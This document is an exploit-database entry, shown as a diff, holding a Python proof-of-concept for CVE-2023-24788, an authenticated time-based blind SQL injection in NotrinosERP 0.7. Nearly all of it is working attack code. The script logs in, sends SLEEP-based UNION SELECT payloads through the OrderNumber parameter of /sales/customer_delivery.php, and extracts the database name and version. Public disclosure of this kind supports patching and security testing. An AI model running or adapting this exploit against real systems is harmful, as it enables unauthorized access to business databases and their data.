@@ -1,0 +1,95 @@
+id: 38541
+date: 04/07/2023
+title: NotrinosERP 0.7 - Authenticated Blind SQL Injection Exploit
+author: Arvandy
+cves: CVE-2023-24788
+
+# Exploit Title: NotrinosERP 0.7 - Authenticated Blind SQL Injection
+# Exploit Author: Arvandy
+# Blog Post: https://github.com/arvandy/CVE/blob/main/CVE-2023-24788/CVE-2023-24788.md
+# Software Link: https://github.com/notrinos/NotrinosERP/releases/tag/0.7
+# Vendor Homepage: https://notrinos.com/
+# Version: 0.7
+# Tested on: Windows, Linux
+# CVE: CVE-2023-24788
+
+"""
+The endpoint /sales/customer_delivery.php is vulnerable to Authenticated Blind SQL Injection (Time-based) via the GET parameter OrderNumber. 
+This endpoint can be triggered through the following menu: Sales - Sales Order Entry - Place Order - Make Delivery Against This Order.
+The OrderNumber parameter require a valid orderNumber value.
+
+This script is created as Proof of Concept to retrieve database name and version through the Blind SQL Injection that discovered on the application.
+"""
+
+
+import sys, requests
+
+def injection(target, inj_str, session_cookies):    
+    for j in range(32, 126):
+        url = "%s/sales/customer_delivery.php?OrderNumber=%s" % (target, inj_str.replace("[CHAR]", str(j)))
+        headers = {'Content-Type':'application/x-www-form-urlencoded','Cookie':'Notrinos2938c152fda6be29ce4d5ac3a638a781='+str(session_cookies)}              
+        r = requests.get(url, headers=headers)
+        res = r.text
+        if "NotrinosERP 0.7 - Login" in res:
+            session_cookies = login(target, username, password)
+            headers = {'Content-Type':'application/x-www-form-urlencoded','Cookie':'Notrinos2938c152fda6be29ce4d5ac3a638a781='+str(session_cookies)}
+            r = requests.get(url, headers=headers)
+        elif (r.elapsed.total_seconds () > 2 ):
+            return j
+    return None
+
+def login(target, username, password):
+    target = "%s/index.php" % (target)
+    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
+    data = "user_name_entry_field=%s&password=%s&company_login_name=0" % (username, password)
+    s = requests.session()
+    r = s.post(target, data = data, headers = headers)
+    return s.cookies.get('Notrinos2938c152fda6be29ce4d5ac3a638a781')
+    
+def retrieveDBName(session_cookies):   
+    db_name = ""
+    print("(+) Retrieving database name")
+    for i in range (1,100):
+        injection_str = "15+UNION+SELECT+IF(ASCII(SUBSTRING((SELECT+DATABASE()),%d,1))=[CHAR],SLEEP(2),null)-- -" % i
+        retrieved_value = injection(target, injection_str, session_cookies)
+        if (retrieved_value):
+            db_name += chr(retrieved_value)            
+        else:
+            break
+    print("Database Name: "+db_name) 
+
+def retrieveDBVersion(session_cookies):
+    db_version = ""
+    print("(+) Retrieving database version")
+    for i in range (1,100):
+        injection_str = "15+UNION+SELECT+IF(ASCII(SUBSTRING((SELECT+@@version),%d,1))=[CHAR],SLEEP(2),null)-- -" % i
+        retrieved_value = injection(target, injection_str, session_cookies)
+        if (retrieved_value):
+            db_version += chr(retrieved_value)
+            sys.stdout.flush()
+        else:
+            break
+    print("Database Version: "+db_version)
+
+def main():
+    print("(!) Login to the target application")
+    session_cookies = login(target, username, password)   
+    
+    print("(!) Exploiting the Blind Auth SQL Injection to retrieve database name and versions")
+    retrieveDBName(session_cookies)
+    print("")
+    retrieveDBVersion(session_cookies)
+    
+if __name__ == "__main__":
+    if len(sys.argv) != 4:
+        print("(!) Usage: python3 exploit.py <URL> <username> <password>")
+        print("(!) E.g.,: python3 exploit.py http://192.168.1.100/NotrinosERP user pass")
+        sys.exit(-1)
+
+    target = sys.argv[1]
+    username = sys.argv[2]
+    password = sys.argv[3]
+    
+    main()
+
+#  0day.today [2023-04-19]  #
